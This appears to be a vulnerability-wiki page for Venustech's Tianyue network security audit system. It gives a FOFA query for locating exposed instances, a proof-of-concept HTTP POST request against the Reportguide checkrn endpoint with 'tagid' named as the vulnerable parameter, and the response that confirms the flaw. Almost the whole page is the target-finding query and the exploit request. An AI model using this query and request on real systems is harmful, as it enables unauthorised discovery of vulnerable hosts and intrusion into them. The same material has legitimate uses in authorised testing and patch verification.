<languages />

FOFA
----

    app="启明星辰-天玥网络安全审计"

POC
---

    POST /ops/index.php?c=Reportguide&a=checkrn HTTP/1.1
    Host xxx
    User-Agent: Mozilla/5.0(Macintosh;Intel Mac OS X 10.15;rv:88.0) Gecko/20100101 Firefox/88.0
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3en;q=0.2
    Accept-Encoding: gzip,deflate
    Upgrade-Insecure-Requests: 1
    Connection: close
    Content-Type: application/x-www-from-urlencoded
    Content-Length: 23
    checkname=123&tagid=123

<translate> 漏洞參數：`tagid` </translate>

    /ops/index.php?c=Reportguide&a=checkrn&a=checkrn

<translate> 如果返回以下信息，則漏洞存在 </translate>

    {msg:,code:16,status:0}